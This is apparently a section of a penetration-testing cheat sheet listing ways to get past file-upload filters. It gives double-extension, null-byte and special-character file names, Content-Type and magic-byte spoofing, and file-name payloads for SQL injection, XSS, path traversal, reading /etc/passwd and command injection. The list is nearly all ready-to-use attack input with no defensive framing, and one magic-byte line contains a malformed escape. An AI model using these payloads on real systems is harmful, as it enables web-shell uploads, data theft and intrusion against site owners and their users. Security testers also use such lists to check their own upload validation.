## Bypasses
#### Double extensions
```bash
file.jpg.php
file.php.jpg
file.php.blah123jpg
file.png.php
file.png.Php5
file.php%00.png
file.php%0d%0a.png
file.php%0a.png
file.php\x00.png
```
#### Null byte
```bash
file.php%00.gif
file.php\x00.gif
file.php%00.png
file.php\x00.png
file.php%00.jpg
file.php\x00.jpg
```
#### Special characters
```bash
file.php......
file.php%20
file.php%0a
file.php%00
file.php%0d%0a
file.php/
file.php.\
file.
file.pHp5....
file.%E2%80%AEphp.jpg
```
#### Content-type Bypass
```bash
#Original name but different content-type
Content-Type: image/jpeg
Content-Type: image/gif
Content-Type: image/png
```
#### Magic bytes
```bash
#Sometimes applications identify file types based on their first signature bytes. Adding/replacing them in a file might trick the application
PNG: \x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\xs0\x03[
JPG: \xff\xd8\xff
GIF: GIF87a
GIF: GIF8
```
#### Triple equal
```bash
/?file=shell.php    <-- Blocked
/?file===shell.php  <-- Bypassed
```
#### Filename Vulnerabilities
```bash
#Time-Based SQLi Payloads
poc.js'(select*from(select(sleep(20)))a)+'.extension

#LFI Payloads
image.png../../../../../../../etc/passwd

#XSS Payloads
'"><img src=x onerror=alert(document.domain)>.extension

#File Traversal
../../../tmp/lol.png

#Command Injection
; sleep 10;
```
